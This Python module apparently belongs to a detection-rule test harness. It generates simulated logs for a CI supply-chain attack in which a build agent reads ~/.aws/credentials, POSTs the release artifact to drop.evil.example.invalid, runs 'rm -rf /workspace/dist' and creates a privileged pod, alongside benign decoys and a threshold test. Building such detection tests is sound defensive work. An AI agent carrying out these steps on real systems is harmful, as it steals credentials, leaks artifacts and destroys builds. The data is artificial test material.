"""storyline_supply_chain_ci -- poisoned dependency on a CI runner -> the build agent reads cloud
credentials, runs away, exfiltrates an artifact, sabotages the pipeline -> privileged pod.

Registered by ``scenario_registry._discover`` (module name ``storyline_*``, exports ``STORYLINE``).

    malicious_dependency -> ci_secret_read -> agent_runaway -> artifact_exfil -> pipeline_sabotage
        -> privileged_runner

WHAT IT CAN SHOW THAT THE OTHER STORYLINES CANNOT
    * the AI-AGENT rule family on real mcp_agent tool-call logs outside the OT chain: credential
      file access, a tool-call BURST (``agent_tool_call_burst``, the one shipped rule with no
      mitre block), egress to a non-allowlisted domain and a destructive shell command;
    * a VOLUME rule keyed on a SESSION, isolated by construction: the burst runs in its own agent
      session, so the single calls of the other steps cannot inflate it (and vice versa);
    * one honest gap: the poisoned package install itself (T1195.001) -- no rule reads it.

TELEMETRY. Real parsers throughout (sysmon, mcp_agent, k8s_audit); every step parses. All agent
calls and the pod creation come from the CI runner's one address, the shared observable.

STRUCTURE VARIES WITH THE SEED: the burst size (56-70 calls, all inside 55 s), the runner
address, the session ids, the package name and the exfil path.

SAFETY. Simulation only: private 10.0.0.0/8 runner address, ``.invalid`` / ``example`` names, a
fixed calendar instant (Tue 2025-07-01 03:10 UTC, no wall clock). Nothing is executed: the
"commands" are strings inside audit-log records.
"""
from __future__ import annotations

import sys
from pathlib import Path
from random import Random

TWIN = Path(__file__).resolve().parent
if str(TWIN) not in sys.path:
    sys.path.insert(0, str(TWIN))

from scenario import ChainStepSpec, NegativeTwin, ScenarioDef  # noqa: E402
from scenario_kit import epoch_ms, meta  # noqa: E402

START_MS = epoch_ms(2025, 7, 1, 3, 10)

STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("malicious_dependency", "sysmon", True,
                  "npm install runs a poisoned package's postinstall script on the CI runner"),
    ChainStepSpec("ci_secret_read", "mcp_agent", True,
                  "the build agent reads ~/.aws/credentials"),
    ChainStepSpec("agent_runaway", "mcp_agent", True,
                  "56-70 tool calls in one agent session within 55 s"),
    ChainStepSpec("artifact_exfil", "mcp_agent", True,
                  "the agent POSTs the build artifact to a non-allowlisted domain"),
    ChainStepSpec("pipeline_sabotage", "mcp_agent", True,
                  "the agent runs rm -rf on the build output"),
    ChainStepSpec("privileged_runner", "k8s_audit", True,
                  "a privileged pod is created with the build bot's identity"),
)

_PACKAGES = ("left-padder", "colorize-utils", "fast-json-merge", "env-loader-x")


def _rule_id(stem: str) -> str:
    """A rule's id read from its own file (the twins name a rule by stem, never by a copied id)."""
    import yaml  # noqa: PLC0415
    path = TWIN.parents[1] / "contracts" / "rules" / f"{stem}.yml"
    return str(yaml.safe_load(path.read_text(encoding="utf-8"))["id"])


def _build(seed: int, *, n_burst: int | None = None):
    """The one builder every twin shares; ``n_burst`` overrides the burst size only."""
    rng = Random(seed * 2741 + 67)
    runner_ip = f"10.80.{rng.randint(1, 9)}.{rng.randint(20, 200)}"
    pkg = rng.choice(_PACKAGES)
    drawn_burst = rng.randint(56, 70)                # rule threshold: 50 calls per session / 60 s
    build_session = f"sess-build-{seed:04d}-{rng.randint(100, 999)}"
    burst_session = f"sess-loop-{seed:04d}-{rng.randint(100, 999)}"
    n_burst = drawn_burst if n_burst is None else n_burst
    steps = {s.label: s for s in STEPS}
    ordinal = {s.label: i for i, s in enumerate(STEPS)}
    payloads: list = []
    notes: dict = {}
    seen: dict = {}

    def add(label: str, source_type: str, raw, ts: int) -> None:
        k = seen.get(label, 0)
        seen[label] = k + 1
        payloads.append((steps[label], {"source_type": source_type, "raw": raw,
                                        "meta": meta(seed, "sc", ordinal[label] * 100 + k, ts, runner_ip)}))

    def call(session: str, tool: str, args: dict, ts: int) -> dict:
        return {"ts": ts, "session_id": session, "agent": "ci-build-agent", "server": "ci-tools",
                "tool": tool, "arguments": args, "outcome": "success", "client_ip": runner_ip}

    t = START_MS
    add("malicious_dependency", "sysmon",
        {"EventID": 1, "TimeCreated": t, "Computer": "ci-runner-03", "Image": "/usr/bin/node",
         "CommandLine": f"node ./node_modules/{pkg}/scripts/postinstall.js", "ProcessId": "4410",
         "ParentImage": "/usr/bin/npm", "ParentProcessId": "4400", "User": "ci"}, t)
    notes["malicious_dependency"] = f"npm postinstall of {pkg} runs on ci-runner-03"

    t = START_MS + 60_000
    add("ci_secret_read", "mcp_agent", call(build_session, "read_file", {"path": "~/.aws/credentials"}, t), t)
    notes["ci_secret_read"] = "read_file ~/.aws/credentials in the build session"

    t = START_MS + 120_000
    step_ms = 55_000 // max(1, n_burst)                       # all calls inside 55 s
    for i in range(n_burst):
        add("agent_runaway", "mcp_agent",
            call(burst_session, "read_file", {"path": f"/workspace/src/module_{i:03d}.py"}, t + i * step_ms),
            t + i * step_ms)
    notes["agent_runaway"] = f"{n_burst} read_file calls in session {burst_session} within 55 s"

    t = START_MS + 240_000
    add("artifact_exfil", "mcp_agent",
        call(build_session, "http_post", {"url": "https://drop.evil.example.invalid/upload",
                                          "body_ref": "/workspace/dist/release.tgz"}, t), t)
    notes["artifact_exfil"] = "http_post of release.tgz to drop.evil.example.invalid"

    t = START_MS + 300_000
    add("pipeline_sabotage", "mcp_agent",
        call(build_session, "run_shell", {"command": "rm -rf /workspace/dist"}, t), t)
    notes["pipeline_sabotage"] = "run_shell rm -rf /workspace/dist"

    t = START_MS + 360_000
    add("privileged_runner", "k8s_audit",
        {"auditID": f"audit-sc-{seed}", "verb": "create", "user": {"username": "build-bot"},
         "sourceIPs": [runner_ip],
         "objectRef": {"resource": "pods", "namespace": "ci", "name": "runner-debug"},
         "requestObject": {"spec": {"securityContext": {"privileged": True}}},
         "responseStatus": {"code": 201}}, t)
    notes["privileged_runner"] = f"build-bot creates a privileged pod from {runner_ip}"

    return payloads, {}, notes, None


def build(seed: int):
    return _build(seed)


# ---------------------------------------------------------------------------
# Benign look-alike: a second runner's legitimate agent session doing a large refactor -- many
# read_file calls, the documented false-positive shape of agent_tool_call_burst. Own address, own
# session; overlaps the attack window.
# ---------------------------------------------------------------------------
DECOY_STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("decoy_refactor_session", "mcp_agent", True,
                  "another runner's agent reads 55 files for a refactor (BENIGN)"),
)


def _build_decoys(seed: int) -> list:
    spec = DECOY_STEPS[0]
    out: list = []
    t = START_MS + 130_000
    for i in range(55):
        ts = t + i * 1_000
        out.append((spec, {"source_type": "mcp_agent",
                           "raw": {"ts": ts, "session_id": f"sess-refactor-{seed:04d}", "agent": "dev-agent",
                                   "server": "ci-tools", "tool": "read_file",
                                   "arguments": {"path": f"/workspace/lib/part_{i:03d}.py"},
                                   "outcome": "success", "client_ip": "10.81.0.7"},
                           "meta": meta(seed, "scd", i, ts, "10.81.0.7")}))
    return out


NEGATIVES: tuple[NegativeTwin, ...] = (
    NegativeTwin(
        name="burst_49_of_50_calls", step="agent_runaway", rule_ids=(_rule_id("agent_tool_call_burst"),),
        attribute="tool calls in the runaway session: 49, one under the rule's 50",
        build=lambda seed, restored: _build(seed, n_burst=50 if restored else 49)),
)

STORYLINE = ScenarioDef(
    name="supply_chain_ci",
    steps=STEPS,
    build=build,
    oracle_path=TWIN / "oracle_supply_chain_ci.yaml",
    summary="poisoned npm package -> agent reads cloud creds -> runaway tool calls -> artifact exfil "
            "-> rm -rf -> privileged pod",
    decoy=_build_decoys,
    decoy_steps=DECOY_STEPS,
    negatives=NEGATIVES,
)
